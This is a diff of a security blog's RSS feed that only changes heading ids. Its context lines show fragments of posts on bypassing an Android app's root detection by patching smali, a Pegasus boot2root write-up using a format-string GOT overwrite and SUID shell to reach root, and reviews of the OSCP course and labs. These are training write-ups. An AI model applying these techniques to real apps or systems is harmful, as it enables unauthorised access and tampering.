 &lt;p&gt;Recently I had the opportunity to poke at an Android &lt;code&gt;.apk&lt;/code&gt;. My task was a little different from what I am about to blog about, but the fundamental idea remained the same. I wanted to inspect some traffic of an application, but the application had jailbreak detection built in and refused to run if the device its running on is detected as jailbroken. This had to be bypassed first. To play with the &lt;code&gt;apk&lt;/code&gt;, I needed to get some tools setup and learn a few things about the Android environment &lt;em&gt;really&lt;/em&gt; fast. There are tons of resources available online to describe to you the general idea behind Android, as well as how its all stitched together. You will quickly come to realize that apps can be written in Java. For the purpose of this post, the focus is to bypass the jailbreak detection the &lt;code&gt;apk&lt;/code&gt; had and let it continue normal operations.&lt;/p&gt;
 
-&lt;h2 id=&#34;so-what-about-jailbreaking:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;so what about jailbreaking&lt;/h2&gt;
+&lt;h2 id=&#34;so-what-about-jailbreaking&#34;&gt;so what about jailbreaking&lt;/h2&gt;
 
 &lt;p&gt;While I refer to jailbreaking, there are a number of terms used out there to describe the same thing. In the Android world, &lt;em&gt;rooting&lt;/em&gt; seems to be what is more commonly known. However, the premise remains the same. Rooting/Jailbreaking your device means that you escape the OS implemented sandboxing and gain full &lt;code&gt;root&lt;/code&gt; access to your device. Many mobile applications are against this as a compromised sandbox may have occurred unknowingly, effectively meaning that the device is compromised. So, as a safety measure, applications check for this and refuse to run because of it.&lt;/p&gt;
 
 &lt;p&gt;Jailbreak detection itself is a interesting field. From simple static file existence checks, to checking the exit codes of calls to &lt;code&gt;fork()&lt;/code&gt; and &lt;code&gt;su&lt;/code&gt; all the way to inspecting loaded &lt;code&gt;dynalibs&lt;/code&gt; (in the iOS world), everything is fair game. While a compromised device is a totally legit reason to not run any sensitive applications (think credential theft, traffic redirection etc), there are cases where a jailbroken device occurred on purpose. In these cases, power users may find application jailbreak detection very annoying :)&lt;/p&gt;
 
-&lt;h2 id=&#34;getting-started:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;getting started&lt;/h2&gt;
+&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;
 
 &lt;p&gt;The very first thing one would obviously need is the application you want to modify. I already had the &lt;code&gt;apk&lt;/code&gt; I wanted to modify at hand. If you don’t have it then there are many ways to get an already installed &lt;code&gt;apk&lt;/code&gt; off a device. You just need to Google it :) Like, &lt;a href=&#34;http://stackoverflow.com/questions/4032960/how-do-i-get-an-apk-file-from-an-android-device&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
 
@@ -4079,7 +4079,7 @@ myApplication: Mach-O executable arm
 &lt;/figure&gt;
 
 
-&lt;h2 id=&#34;preparing-an-actual-emulator:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;preparing an actual emulator&lt;/h2&gt;
+&lt;h2 id=&#34;preparing-an-actual-emulator&#34;&gt;preparing an actual emulator&lt;/h2&gt;
 
 &lt;p&gt;With the software I needed for the emulator downloaded and ready, it was time to configure a &lt;code&gt;avd&lt;/code&gt; (Android Virtual Device). I fired up the command &lt;code&gt;~/Library/Android/sdk/tools/android avd&lt;/code&gt; and was presented with the Android Virtual Device Manager. I then proceeded to create a New device as follows:&lt;/p&gt;
 
@@ -4119,9 +4119,9 @@ Success
 
 &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; If you get a error such as &lt;em&gt;INSTALL_FAILED_DUPLICATE_PERMISSION&lt;/em&gt;, it usually meant that the application is already installed. Simply uninstall it from the emulator and retry the install. The storage on the emulator was persistent throughout reboots for me which was quite nice too.&lt;/p&gt;
 
-&lt;h2 id=&#34;looking-at-the-apk-getting-the-juicy-bits:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;looking at the apk, getting the juicy bits&lt;/h2&gt;
+&lt;h2 id=&#34;looking-at-the-apk-getting-the-juicy-bits&#34;&gt;looking at the apk, getting the juicy bits&lt;/h2&gt;
 
-&lt;p&gt;Before I could even begin to think about where to look for the Jailbreak checking code, I first had to understand very quickly how a &lt;code&gt;apk&lt;/code&gt; gets to be, and what it contains. Most importantly, the &lt;code&gt;apk&lt;/code&gt; can be unzipped and its contents further examined. &lt;a href=&#34;http://en.wikipedia.org/wiki/Android_application_package&#34;&gt;Wikipedia&lt;/a&gt; does a very good of giving you a rundown on a very high level. Just enough to grasp which parts may be of interest. It seemed like the juicy bits I am after will be in &lt;code&gt;classes.dex&lt;/code&gt;. This is what looks like to be the compiled logic in the &lt;a href=&#34;http://en.wikipedia.org/wiki/Dalvik_(software&#34;&gt;dex file format&lt;/a&gt; understandable by the Dalvik virtual machine. Ok. But how do I make that into something &lt;strong&gt;I&lt;/strong&gt; can understand?&lt;/p&gt;
+&lt;p&gt;Before I could even begin to think about where to look for the Jailbreak checking code, I first had to understand very quickly how a &lt;code&gt;apk&lt;/code&gt; gets to be, and what it contains. Most importantly, the &lt;code&gt;apk&lt;/code&gt; can be unzipped and its contents further examined. &lt;a href=&#34;http://en.wikipedia.org/wiki/Android_application_package&#34;&gt;Wikipedia&lt;/a&gt; does a very good of giving you a rundown on a very high level. Just enough to grasp which parts may be of interest. It seemed like the juicy bits I am after will be in &lt;code&gt;classes.dex&lt;/code&gt;. This is what looks like to be the compiled logic in the [dex file format](&lt;a href=&#34;http://en.wikipedia.org/wiki/Dalvik_(software&#34;&gt;http://en.wikipedia.org/wiki/Dalvik_(software&lt;/a&gt;) understandable by the Dalvik virtual machine. Ok. But how do I make that into something &lt;strong&gt;I&lt;/strong&gt; can understand?&lt;/p&gt;
 
 &lt;p&gt;In comes &lt;a href=&#34;https://code.google.com/p/dex2jar/&#34;&gt;dex2jar&lt;/a&gt;. A utility that will convert android dex files into Java source. :) I &lt;a href=&#34;https://dex2jar.googlecode.com/files/dex2jar-0.0.9.15.zip&#34;&gt;downloaded&lt;/a&gt; the latest archive and extracted it. I then extracted classes.dex from the &lt;code&gt;apk&lt;/code&gt; too:&lt;/p&gt;
 
@@ -4154,7 +4154,7 @@ Done.
 
 &lt;p&gt;This is only a section of the code that attempts to detect if the device that the application is running on is rooted. Quite a number of checks are present, however the failure comes in where its only 1 method that is being used to return the Jailbreak status. This method was right at the end and was called &lt;code&gt;isRooted&lt;/code&gt;. You will see in the next few paragraphs how trivial it is to bypass this.&lt;/p&gt;
 
-&lt;h2 id=&#34;decompiling-the-classes-dex:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;decompiling the classes.dex&lt;/h2&gt;
+&lt;h2 id=&#34;decompiling-the-classes-dex&#34;&gt;decompiling the classes.dex&lt;/h2&gt;
 
 &lt;p&gt;With some knowledge about the code, and knowing what I am after (the &lt;code&gt;RootDetection&lt;/code&gt; class, &lt;code&gt;isRooted&lt;/code&gt; method), it was time to move on to decompiling the dex to smali. This can be done easily using &lt;a href=&#34;https://code.google.com/p/smali/&#34;&gt;smali/baksmali&lt;/a&gt; which is an assembler/disassembler for Android&amp;rsquo;s dex format. I downloaded the latest versions of &lt;a href=&#34;https://bitbucket.org/JesusFreke/smali/downloads/smali-2.0.5.jar&#34;&gt;smali&lt;/a&gt; and &lt;a href=&#34;https://bitbucket.org/JesusFreke/smali/downloads/baksmali-2.0.5.jar&#34;&gt;baksmali&lt;/a&gt; and prepared to disassemble the &lt;code&gt;classes.dex&lt;/code&gt; file that we used earlier to get some Java sources out of.&lt;/p&gt;
 
@@ -4190,7 +4190,7 @@ out//com/MyApplication/utils/RootDetection.smali:.method public isRooted(Landroi
 
 &lt;p&gt;Awesome.&lt;/p&gt;
 
-&lt;h2 id=&#34;preparing-the-patch:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;preparing the patch&lt;/h2&gt;
+&lt;h2 id=&#34;preparing-the-patch&#34;&gt;preparing the patch&lt;/h2&gt;
 
 &lt;p&gt;As we can see, &lt;code&gt;isRooted&lt;/code&gt; has quite a bit of logic in it. Referring back to the &lt;code&gt;jar&lt;/code&gt; file I created with &lt;code&gt;dex2jar&lt;/code&gt;, we can deduce that we want &lt;code&gt;isRooted&lt;/code&gt; to return &lt;code&gt;false&lt;/code&gt;. Makes sense right? Now, I don’t write smali out of my head, but that did not stop me. How can I see what smali code would look like to just return &lt;code&gt;false&lt;/code&gt;? Well, I could just write my own &lt;code&gt;.java&lt;/code&gt; code, compile it, and check what the output is like once its disassembled right? Yep!&lt;/p&gt;
 
@@ -4234,7 +4234,7 @@ RootDetection.class: compiled Java class data, version 50.0 (Java 1.6)
 
 &lt;p&gt;With the &lt;code&gt;RootDetection&lt;/code&gt; class now patched, I re-assembled the &lt;code&gt;classes.dex&lt;/code&gt; file from the generated smali code with &lt;code&gt;java -jar smali-2.0.5.jar -o classes.dex out&lt;/code&gt;. The Reassembly generated no errors so I assumed it was successful.&lt;/p&gt;
 
-&lt;h2 id=&#34;repackaging-and-signing-the-apk:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;repackaging and signing the apk&lt;/h2&gt;
+&lt;h2 id=&#34;repackaging-and-signing-the-apk&#34;&gt;repackaging and signing the apk&lt;/h2&gt;
 
 &lt;p&gt;With the patch applied and the new &lt;code&gt;classes.dex&lt;/code&gt; generated, it was time to repackage the &lt;code&gt;apk&lt;/code&gt;. The first step was to add the new &lt;code&gt;classes.dex&lt;/code&gt; to the &lt;code&gt;apk&lt;/code&gt;:&lt;/p&gt;
 
@@ -4246,7 +4246,7 @@ updating: classes.dex (deflated 56%)
 
 &lt;p&gt;Excellent. The only thing left for me to do was to install the application using &lt;code&gt;adb&lt;/code&gt; and see if my patch worked, which it did! :D The usual error message about the jailbreak no longer displayed and I could continue with the rest of my testing.&lt;/p&gt;
 
-&lt;h2 id=&#34;notes-about-traffic-interception:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;notes about traffic interception&lt;/h2&gt;
+&lt;h2 id=&#34;notes-about-traffic-interception&#34;&gt;notes about traffic interception&lt;/h2&gt;
 
 &lt;p&gt;I have covered what I originally intended with the jailbreak detection patching, but want to add a few notes about traffic interception using the Emulator.&lt;/p&gt;
 
@@ -4493,7 +4493,7 @@ if __name__ == &amp;quot;__main__&amp;quot;:
 
 &lt;p&gt;As a final note on the proxy script. At some stage it looked as though names were not being resolved correctly as I was seeing output as &lt;code&gt;DNS: clients3.google.com -&amp;gt; 1.1.1.4&lt;/code&gt;. This is just the internal storage key and not the IP it resolved :D&lt;/p&gt;
 
-&lt;h2 id=&#34;summary:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;summary&lt;/h2&gt;
+&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;
 
 &lt;p&gt;Like I previously mentioned, with limited knowledge about smali and all that jazz, I was able to patch the application to not do the jailbreak detection it is intended to do. Removing jailbreak detection may not be such a big deal, but what else can you change, and how do you protect against that?&lt;/p&gt;
 </description>
@@ -4507,7 +4507,7 @@ if __name__ == &amp;quot;__main__&amp;quot;:
       <guid>https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/</guid>
       <description>
 
-&lt;h2 id=&#34;introduction:2909c52a557f765558fa015a0dc1703a&#34;&gt;introduction&lt;/h2&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/pegasus-1,109/&#34;&gt;Pegasus 1&lt;/a&gt; is a boot2root hosted on &lt;a href=&#34;https://www.vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; built by &lt;a href=&#34;https://twitter.com/theknapsy&#34;&gt;@TheKnapsy&lt;/a&gt;. He wrote a &lt;a href=&#34;http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/&#34;&gt;blogpost&lt;/a&gt; about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).&lt;/p&gt;
 
@@ -4526,7 +4526,7 @@ if __name__ == &amp;quot;__main__&amp;quot;:
 
 &lt;p&gt;Lets begin.&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap-again:2909c52a557f765558fa015a0dc1703a&#34;&gt;nmap, again&lt;/h2&gt;
+&lt;h2 id=&#34;nmap-again&#34;&gt;nmap, again&lt;/h2&gt;
 
 &lt;p&gt;Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&amp;hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:&lt;/p&gt;
 
@@ -4551,7 +4551,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
 
 &lt;p&gt;&lt;code&gt;tcp/22&lt;/code&gt;, &lt;code&gt;tcp/111&lt;/code&gt;, &lt;code&gt;tcp/8088&lt;/code&gt; and &lt;code&gt;tcp/55625&lt;/code&gt;. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on &lt;code&gt;tcp/8088&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;stomping-some-hoofs-with-pegasus:2909c52a557f765558fa015a0dc1703a&#34;&gt;stomping some hoofs with pegasus&lt;/h2&gt;
+&lt;h2 id=&#34;stomping-some-hoofs-with-pegasus&#34;&gt;stomping some hoofs with pegasus&lt;/h2&gt;
 
 &lt;p&gt;Browsing to &lt;a href=&#34;http://192.168.56.101:8088/&#34;&gt;http://192.168.56.101:8088/&lt;/a&gt;, we are presented with a picture of Pegasus:&lt;/p&gt;
 
@@ -4618,7 +4618,7 @@ ID  Response   Lines      Word         Chars          Request
 &lt;/figure&gt;
 
 
-&lt;h2 id=&#34;pwning-mike:2909c52a557f765558fa015a0dc1703a&#34;&gt;pwning mike&lt;/h2&gt;
+&lt;h2 id=&#34;pwning-mike&#34;&gt;pwning mike&lt;/h2&gt;
 
 &lt;p&gt;So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data &lt;code&gt;code&lt;/code&gt; to the previously found &lt;code&gt;submit.php&lt;/code&gt;.&lt;/p&gt;
 
@@ -4807,7 +4807,7 @@ Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129
 mike@pegasus:~$
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;my-first-your-first-we-all-first:2909c52a557f765558fa015a0dc1703a&#34;&gt;my_first, your_first, we_all_first&lt;/h2&gt;
+&lt;h2 id=&#34;my-first-your-first-we-all-first&#34;&gt;my_first, your_first, we_all_first&lt;/h2&gt;
 
 &lt;p&gt;With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in &lt;code&gt;mike&lt;/code&gt;&amp;rsquo;s home (we will get to it shortly):&lt;/p&gt;
 
@@ -4831,7 +4831,7 @@ drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs
 
 &lt;p&gt;The &lt;code&gt;/opt/git/&lt;/code&gt; folder had what looked like remnants of the typical &lt;code&gt;.git/&lt;/code&gt; folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the &lt;code&gt;main.c&lt;/code&gt; file from the git history.&lt;/p&gt;
 
-&lt;h3 id=&#34;rebuilding-main-c:2909c52a557f765558fa015a0dc1703a&#34;&gt;rebuilding main.c&lt;/h3&gt;
+&lt;h3 id=&#34;rebuilding-main-c&#34;&gt;rebuilding main.c&lt;/h3&gt;
 
 &lt;p&gt;&lt;em&gt;This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless&lt;/em&gt;&lt;/p&gt;
 
@@ -4918,7 +4918,7 @@ index 39c0182..b6b2ed4 100644
 
 &lt;p&gt;&lt;code&gt;printf(err_check);&lt;/code&gt; is the potentially vulnerable call&amp;hellip; I think.&lt;/p&gt;
 
-&lt;h3 id=&#34;the-calculator-with-a-hole:2909c52a557f765558fa015a0dc1703a&#34;&gt;the calculator with a hole&lt;/h3&gt;
+&lt;h3 id=&#34;the-calculator-with-a-hole&#34;&gt;the calculator with a hole&lt;/h3&gt;
 
 &lt;p&gt;After toying with the git repository, my attention turned back to the SUID binary. When I run &lt;code&gt;my_first&lt;/code&gt;, I am actually running it as &lt;code&gt;john&lt;/code&gt;. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain &lt;code&gt;john&lt;/code&gt;&amp;rsquo;s privileges! Sounds easy right. :P&lt;/p&gt;
 
@@ -4952,13 +4952,13 @@ Selection:
 
 &lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt; I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. &lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/14960.js&#34; id=&#34;asciicast-14960&#34; async data-theme=&#34;solarized-dark&#34;&gt;&lt;/script&gt;&lt;/p&gt;
 
-&lt;h3 id=&#34;punching-more-than-numbers:2909c52a557f765558fa015a0dc1703a&#34;&gt;punching more than numbers&lt;/h3&gt;
+&lt;h3 id=&#34;punching-more-than-numbers&#34;&gt;punching more than numbers&lt;/h3&gt;
 
 &lt;p&gt;&lt;em&gt;So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to &lt;code&gt;my_first&lt;/code&gt;&amp;rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; for subtly pointing the fail out ;p&lt;/em&gt;&lt;/p&gt;
 
 &lt;p&gt;As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for &lt;code&gt;printf()&lt;/code&gt; using the format string to &lt;code&gt;system()&lt;/code&gt; instead. This means, the next time &lt;code&gt;printf()&lt;/code&gt; is called, it would actually execute &lt;code&gt;system()&lt;/code&gt; with the adjacent argument on the stack. Lets see how this was done.&lt;/p&gt;
 
-&lt;h4 id=&#34;compiling-the-format-string:2909c52a557f765558fa015a0dc1703a&#34;&gt;compiling the format string&lt;/h4&gt;
+&lt;h4 id=&#34;compiling-the-format-string&#34;&gt;compiling the format string&lt;/h4&gt;
 
 &lt;p&gt;We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the &lt;code&gt;./my_first&lt;/code&gt; binary to sample a successful run:&lt;/p&gt;
 
@@ -5172,7 +5172,7 @@ $1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40069060 &amp;lt;system&am
 
 &lt;p&gt;The binary crashes with &lt;code&gt;sh: 1: Selection:: not found&lt;/code&gt;, meaning that it is now trying to run &lt;code&gt;system(&amp;quot;Selection:&amp;quot;)&lt;/code&gt; instead of &lt;code&gt;printf(&amp;quot;Selection:&amp;quot;)&lt;/code&gt; due to the GOT override.&lt;/p&gt;
 
-&lt;h4 id=&#34;finishing-the-exploit:2909c52a557f765558fa015a0dc1703a&#34;&gt;finishing the exploit&lt;/h4&gt;
+&lt;h4 id=&#34;finishing-the-exploit&#34;&gt;finishing the exploit&lt;/h4&gt;
 
 &lt;p&gt;From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get &lt;code&gt;Selection:&lt;/code&gt; to actually mean something, like prepare a small SUID C shell perhaps? :)&lt;/p&gt;
 
@@ -5222,7 +5222,7 @@ $ id
 uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;hoofing-rooting-pegasus:2909c52a557f765558fa015a0dc1703a&#34;&gt;hoofing (rooting) Pegasus&lt;/h2&gt;
+&lt;h2 id=&#34;hoofing-rooting-pegasus&#34;&gt;hoofing (rooting) Pegasus&lt;/h2&gt;
 
 &lt;p&gt;I added the public key of the keypair I generated for Pegasus to &lt;code&gt;john&lt;/code&gt;&amp;rsquo;s authorized_keys file and proceeded to SSH in as him.&lt;/p&gt;
 
@@ -5278,7 +5278,7 @@ drwxr-xr-x 3 root root 4.0K Dec 23 14:32 ..
 uid=0(root) gid=0(root) groups=0(root),1000(john)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag:2909c52a557f765558fa015a0dc1703a&#34;&gt;flag :)&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;flag :)&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag
                ,
@@ -5350,13 +5350,13 @@ more awesome boot2root VMs!
 &lt;/figure&gt;
 
 
-&lt;h2 id=&#34;meet-the-playground:2a52415f9e87951aab5885bc044eb01e&#34;&gt;meet the playground&lt;/h2&gt;
+&lt;h2 id=&#34;meet-the-playground&#34;&gt;meet the playground&lt;/h2&gt;
 
 &lt;p&gt;From the &lt;a href=&#34;http://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/&#34;&gt;offsec website&lt;/a&gt;, &lt;em&gt;The Playground&lt;/em&gt; is described as &lt;em&gt;a safe virtual network environment designed to be attacked and penetrated as a means of learning and sharpening your penetration testing skills&lt;/em&gt;.&lt;/p&gt;
 
 &lt;p&gt;I was still pretty fresh post-PWK and decided to use the Kali VM I used, for The Playground. The setup was pretty much the same as PWK. Get a VPN connectivity pack and gain access to the lab. There is also a dashboard that you gain access to that allows you to revert machines as required, along with functionality to &amp;ldquo;proof&amp;rdquo; you pwnd it by submitting file content found on a host. For each machine you hack, you gain a set amount of points (actually only one point at the time I was testing but I believe this will be different values when released).&lt;/p&gt;
 
-&lt;h2 id=&#34;the-challenges:2a52415f9e87951aab5885bc044eb01e&#34;&gt;the challenges&lt;/h2&gt;
+&lt;h2 id=&#34;the-challenges&#34;&gt;the challenges&lt;/h2&gt;
 
 &lt;p&gt;I won&amp;rsquo;t be going into any details about what you will face in the labs. The feature page mentions &lt;em&gt;&amp;ldquo;Citrix environments, Windows Active Directory Domains, SCADA networks, IPS systems and corporate Antivirus solutions&amp;rdquo;&lt;/em&gt;. All I can do here is &lt;strong&gt;nod&lt;/strong&gt; =). There are quite a vast number of machines waiting for you to explore and learn.&lt;/p&gt;
 
@@ -5364,11 +5364,11 @@ more awesome boot2root VMs!
 
 &lt;p&gt;The only real advice I can give is: &lt;strong&gt;Try Harder&lt;/strong&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;the-not-so-great:2a52415f9e87951aab5885bc044eb01e&#34;&gt;the not so great&lt;/h2&gt;
+&lt;h2 id=&#34;the-not-so-great&#34;&gt;the not so great&lt;/h2&gt;
 
 &lt;p&gt;One thing about these labs that are a pain is the fact that they are shared. You will be busy testing a sploit, when the next thing you know, a machine gets reverted. While this doesn&amp;rsquo;t mean the bug you found is fixed, it may mean you have to rebuild that initial shell. The &lt;a href=&#34;http://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/&#34;&gt;product page&lt;/a&gt; mentions that there may be dedicated hosted labs for corporations which I hope may alleviate this frustration a bit.&lt;/p&gt;
 
-&lt;h2 id=&#34;summary:2a52415f9e87951aab5885bc044eb01e&#34;&gt;summary&lt;/h2&gt;
+&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;
 
 &lt;p&gt;The Playground will quite possibly go a great job at satisfying your craving to dig/learn/explore! I won&amp;rsquo;t say you need to have done PWK before to be able to play in The Playground, no. But, its not bad experience to bring along with you.&lt;/p&gt;
 
@@ -5403,7 +5403,7 @@ more awesome boot2root VMs!
 
 &lt;p&gt;Below is a summary of my experience obtaining OSCP.&lt;/p&gt;
 
-&lt;h2 id=&#34;preperation:6809ed4345dd0e9b990112bd7672048b&#34;&gt;preperation&lt;/h2&gt;
+&lt;h2 id=&#34;preperation&#34;&gt;preperation&lt;/h2&gt;
 
 &lt;p&gt;Taking OSCP was something I wanted to do for quite some time. I have read a number of blogs and experiences from people that have done it, and the most important take from all of that was the amount of time it took. Considering I had a full time job, it was hard for me to gauge exactly how much lab time I would have needed. So, I decided on getting 3 months to start off with.&lt;/p&gt;
 
@@ -5411,7 +5411,7 @@ more awesome boot2root VMs!
 
 &lt;p&gt;With the payments and logistics out of the way, I was scheduled to start 8 Aug &amp;lsquo;14.&lt;/p&gt;
 
-&lt;h2 id=&#34;first-impressions:6809ed4345dd0e9b990112bd7672048b&#34;&gt;first impressions&lt;/h2&gt;
+&lt;h2 id=&#34;first-impressions&#34;&gt;first impressions&lt;/h2&gt;
 
 &lt;p&gt;On the morning of 8 Aug I receive a email with all of the course material and VPN details. I quickly sifted through the videos and pdf materials and decided to have a early look at the lab machines. My very first reaction was &amp;ldquo;Where the heck do I start?&amp;rdquo;. Everything was a little bit of a information overflow, and there is no clear &amp;ldquo;do this, then this, then this.&amp;rdquo;. One is given a overview of what is required from a documentation perspective, but that is about it.&lt;/p&gt;
 
@@ -5419,7 +5419,7 @@ more awesome boot2root VMs!
 
 &lt;p&gt;One of the more important points to make here was the fact that 2 reports are required in the end. The exam report is of course compulsory but the lab report is optional. However, should you struggle to meet the requirements for the exam challenge, it &lt;em&gt;may&lt;/em&gt; be possible to gain some points from your lab report. Of course, if you did not provide one, that chance you have is out the door. With that in mind, I decided to leave the exercises to later when I start to compile the actual lab report and jump right into the labs. In retrospect, I wish I decided to do the exercises first as there were some key elements taught to gear you for the labs.&lt;/p&gt;
 
-&lt;h2 id=&#34;meeting-the-pwk-labs:6809ed4345dd0e9b990112bd7672048b&#34;&gt;meeting the PWK labs&lt;/h2&gt;
+&lt;h2 id=&#34;meeting-the-pwk-labs&#34;&gt;meeting the PWK labs&lt;/h2&gt;
 
 &lt;p&gt;The machines in the lab were of varying difficulty for me. Some of them were almost a little too easy to pwn, while others were way more of a challenge. You are faced with a &lt;em&gt;public&lt;/em&gt; network, and ultimately have to gain access to the &lt;em&gt;admin&lt;/em&gt; network that is nested deeper in. Using some pivoting techniques, the &lt;em&gt;admin&lt;/em&gt; network was definitely the most fun for me.&lt;/p&gt;
 
@@ -5438,23 +5438,23 @@ more awesome boot2root VMs!
 
 &lt;p&gt;Offensive Security have a &lt;a href=&#34;http://www.offensive-security.com/when-things-get-tough/&#34;&gt;mantra that many know&lt;/a&gt;. &lt;em&gt;Try Harder&lt;/em&gt;. This is the classic response a student gets when asking for hints/help. It is probably the worst answer you can get when you have been bashing away at something for such a long time, but also the most rewarding when you &lt;em&gt;finally&lt;/em&gt; get it.&lt;/p&gt;
 
-&lt;h2 id=&#34;pwning-lab-machines-to-prepare-for-the-exam:6809ed4345dd0e9b990112bd7672048b&#34;&gt;pwning lab machines to prepare for the exam&lt;/h2&gt;
+&lt;h2 id=&#34;pwning-lab-machines-to-prepare-for-the-exam&#34;&gt;pwning lab machines to prepare for the exam&lt;/h2&gt;
 
 &lt;p&gt;Many of the lab machines have vulnerabilities that have Metasploit modules. You can easily try the &lt;em&gt;push button, get bacon&lt;/em&gt; technique on them. But, it is important to note that in the exam, you will be restricted to what you can use. In fact, there are very clear Metasploit restrictions. From not being allowed to use Metasploit at all, to only being allowed to use certain features of the meterpreter shell. With this in mind, I will always &lt;strong&gt;highly&lt;/strong&gt; recommend you attempt to exploit as much as possible in the labs without the use of Metasploit.&lt;/p&gt;
 
 &lt;p&gt;Not being allowed to use Metasploit for me personally was not really such a big deal. Having practiced quite a lot in the labs to &lt;em&gt;not&lt;/em&gt; use Metasploit, it was easy to find PoC exploits and modify them as required. I did make a lot of use of &lt;strong&gt;msfpayload&lt;/strong&gt; to generate shellcode, but other than that, plain bind/netcat shells were in the order of the day.&lt;/p&gt;
 
-&lt;h2 id=&#34;last-days-of-the-pwk-lab:6809ed4345dd0e9b990112bd7672048b&#34;&gt;last days of the PWK lab&lt;/h2&gt;
+&lt;h2 id=&#34;last-days-of-the-pwk-lab&#34;&gt;last days of the PWK lab&lt;/h2&gt;
 
 &lt;p&gt;My Lab time was scheduled to end 8 nov 2014. I have spent easily about 4-6 hours a night (where possible) in the labs with even more time on the weekends. With about a week left, I turned my focus to the 3 harder machines in the labs, known as &lt;em&gt;pain&lt;/em&gt;, &lt;em&gt;sufferance&lt;/em&gt; and &lt;em&gt;humble&lt;/em&gt;. These 3 machines definitely were the hardest of the bunch, but I managed to pwn them too. By 7 Nov, I had successfully managed to pwn all of the lab machines and had the first version of my Lab report done.&lt;/p&gt;
 
 &lt;p&gt;It was time to book the exam.&lt;/p&gt;
 
-&lt;h2 id=&#34;oscp-exam:6809ed4345dd0e9b990112bd7672048b&#34;&gt;OSCP Exam&lt;/h2&gt;
+&lt;h2 id=&#34;oscp-exam&#34;&gt;OSCP Exam&lt;/h2&gt;
 
 &lt;p&gt;I managed to secure 19 November @11am as the date I was going to attempt the OSCP Certification Challenge. This actually worked out great for me, as it gave me enough time to catch up on some lost sleep, as well as polish the lab report I was going to send in with my Exam report.&lt;/p&gt;
 
-&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Yeah, I am probably going to need this later tomorrow morning. &lt;a href=&#34;http://t.co/8rcQ7YNwIS&#34;&gt;pic.twitter.com/8rcQ7YNwIS&lt;/a&gt;&lt;/p&gt;&amp;mdash; _leon_jacobs (@leonjza) &lt;a href=&#34;https://twitter.com/leonjza/status/534967808619470849&#34;&gt;November 19, 2014&lt;/a&gt;&lt;/blockquote&gt;
+&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Yeah, I am probably going to need this later tomorrow morning. &lt;a href=&#34;http://t.co/8rcQ7YNwIS&#34;&gt;pic.twitter.com/8rcQ7YNwIS&lt;/a&gt;&lt;/p&gt;&amp;mdash; _leon_jacobs() (@leonjza) &lt;a href=&#34;https://twitter.com/leonjza/status/534967808619470849&#34;&gt;November 19, 2014&lt;/a&gt;&lt;/blockquote&gt;
 &lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
 
